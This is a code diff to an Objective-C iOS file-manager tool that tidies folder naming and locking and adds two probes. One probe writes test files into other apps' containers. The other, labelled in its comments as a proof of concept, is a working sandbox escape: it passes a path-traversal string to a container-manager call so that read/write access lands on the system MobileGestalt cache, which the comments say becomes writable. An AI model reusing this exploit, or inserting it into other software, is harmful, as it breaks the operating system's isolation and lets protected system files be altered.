@@ -8,6 +8,7 @@
 #import "MCMBridge.h"
 #import "FFLogger.h"
 #import "FFLSDiscovery.h"
+#import "FFFileOperationService.h"
 
 #import <fcntl.h>
 #import <limits.h>
@@ -526,7 +527,9 @@ static NSDictionary *MCMCustomIdentifiers(void)
 
 - (void)rescanWithCompletion:(void (^)(void))completion
 {
-    _scanCompletion = completion;
+    @synchronized (self) {
+        _scanCompletion = completion;
+    }
     dispatch_async(_scanQueue, ^{
         [self startOnce];
     });
@@ -552,10 +555,17 @@ static NSDictionary *MCMCustomIdentifiers(void)
     [fm createDirectoryAtPath:root withIntermediateDirectories:YES
         attributes:@{NSFilePosixPermissions: @0700} error:nil];
 
-    // Scope: App Data only. Links live in an "App Data" folder next to
+    // Scope: App Data only. Links live in an "AppData" folder next to
     // the log file inside our own container root. All other container
     // classes are intentionally not probed anymore.
-    NSString *apps = [root stringByAppendingPathComponent:@"App Data"];
+    NSString *apps = [root stringByAppendingPathComponent:@"AppData"];
+    // 迁移旧目录名（"App Data" -> "AppData"），仅当目标不存在。
+    NSString *legacyApps = [root stringByAppendingPathComponent:@"App Data"];
+    BOOL legacyIsDir = NO;
+    BOOL legacyExists = [fm fileExistsAtPath:legacyApps isDirectory:&legacyIsDir];
+    BOOL newExists = [fm fileExistsAtPath:apps];
+    if (legacyExists && !newExists && legacyIsDir)
+        [fm moveItemAtPath:legacyApps toPath:apps error:nil];
     [fm createDirectoryAtPath:apps withIntermediateDirectories:YES
         attributes:@{NSFilePosixPermissions: @0700} error:nil];
     [self removeLegacyDirectoriesUnder:root];
@@ -576,6 +586,16 @@ static NSDictionary *MCMCustomIdentifiers(void)
     FFLogTag(@"MCM", @"seeded app identifiers=%lu linked=%lu",
              (unsigned long)seeded, (unsigned long)linkedSeeded);
     [self postScanProgress:1.0 linked:linkedSeeded total:seeded scanning:NO];
+
+    // 启动自检：向第一个已链接的第三方 App 容器写入临时文件再删除，
+    // 直接报告写能力（含 errno），便于区分"build 太旧"与"真写失败"。
+    [self runWriteProbe:appIdentifiers];
+
+    // Geod-MCM 通道：class-12 geod + part 3 + partDomain 路径穿越，
+    // 把读写 extension 重定向到 MobileGestalt 缓存目录（iOS 26/27 可用）。
+    // 成功后虚拟根出现 "[MHA-C12] MobileGestalt Cache" 链接，
+    // com.apple.MobileGestalt.plist 即可读写。
+    [self runMobileGestaltProbe:root];
 
     // iOS 26 hides third-party apps from ContainerManager/LaunchServices
     // enumeration, but the LaunchServices store inside com.apple.lsd still
@@ -640,6 +660,83 @@ static NSDictionary *MCMCustomIdentifiers(void)
             completion();
         });
     }
+}
+
+// 写能力自检：选第一个非 MHA 的已链接容器，在 tmp（或 Documents）
+// 下创建临时文件再删除，结果写入日志。任何失败都会给出 errno。
+- (void)runWriteProbe:(NSOrderedSet<NSString *> *)appIdentifiers
+{
+    NSString *root = MCMVirtualRoot();
+    if (!root.length) {
+        FFLogTag(@"WriteProbe", @"skipped: virtual root missing");
+        return;
+    }
+    NSString *target = nil;
+    for (NSString *identifier in appIdentifiers) {
+        if ([identifier isEqualToString:@"com.apple.mobile.MobileHouseArrest"])
+            continue;
+        NSString *link = [[root stringByAppendingPathComponent:@"AppData"]
+            stringByAppendingPathComponent:identifier];
+        NSString *tmp = [link stringByAppendingPathComponent:@"tmp"];
+        NSString *docs = [link stringByAppendingPathComponent:@"Documents"];
+        BOOL isDir = NO;
+        if ([[NSFileManager defaultManager] fileExistsAtPath:tmp isDirectory:&isDir] && isDir)
+            target = tmp;
+        else if ([[NSFileManager defaultManager] fileExistsAtPath:docs isDirectory:&isDir] && isDir)
+            target = docs;
+        if (target) break;
+    }
+    if (!target) {
+        FFLogTag(@"WriteProbe", @"skipped: no linked third-party container");
+        return;
+    }
+    NSString *probe = [target stringByAppendingPathComponent:@".ffwriteprobe"];
+    NSError *error = nil;
+    if (![[FFFileOperationService sharedService] createEmptyFileAtPath:probe error:&error]) {
+        FFLogTag(@"WriteProbe", @"create FAIL dir=%@ errno=%ld (%@)",
+            target, (long)error.code, error.localizedDescription);
+        return;
+    }
+    if (![[FFFileOperationService sharedService] removeItemAtPath:probe error:&error]) {
+        FFLogTag(@"WriteProbe", @"delete FAIL dir=%@ errno=%ld (%@)",
+            target, (long)error.code, error.localizedDescription);
+        return;
+    }
+    FFLogTag(@"WriteProbe", @"OK dir=%@", target);
+}
+
+// Geod-MCM-PoC：class-12 (System Data) com.apple.geod，part 3，
+// partDomain 用路径穿越把读写 extension 重定向到 MobileGestalt
+// 缓存目录（FilzaSlop 同款通道，iOS 26/27 beta 可用）。
+// 只读验证通过后安装链接，不修改任何目标文件。
+- (void)runMobileGestaltProbe:(NSString *)root
+{
+    if (!root.length) return;
+    NSString *detail = nil;
+    NSString *path = [self activateScoped:12 identifier:@"com.apple.geod"
+        group:NO part:3
+        partDomain:@"../../../../../../containers/Shared/SystemGroup/"
+            @"systemgroup.com.apple.mobilegestaltcache/Library/Caches"
+        flags:0x8100000000ULL error:&detail];
+    if (!path.length) {
+        FFLogTag(@"MCM", @"MobileGestalt channel unavailable detail=%@",
+            detail ?: @"(nil)");
+        return;
+    }
+    // 只读验证目标文件确实在覆盖范围内。
+    NSString *plist = [path stringByAppendingPathComponent:
+        @"com.apple.MobileGestalt.plist"];
+    int descriptor = open(plist.fileSystemRepresentation,
+        O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+    if (descriptor < 0) {
+        FFLogTag(@"MCM", @"MobileGestalt plist open FAIL path=%@ errno=%d",
+            plist, errno);
+        return;
+    }
+    close(descriptor);
+    FFLogTag(@"MCM", @"MobileGestalt channel OK path=%@", path);
+    [self installLinkForTarget:path directory:root
+        identifier:@"[MHA-C12] MobileGestalt Cache" containerClass:12];
 }
 
 @end
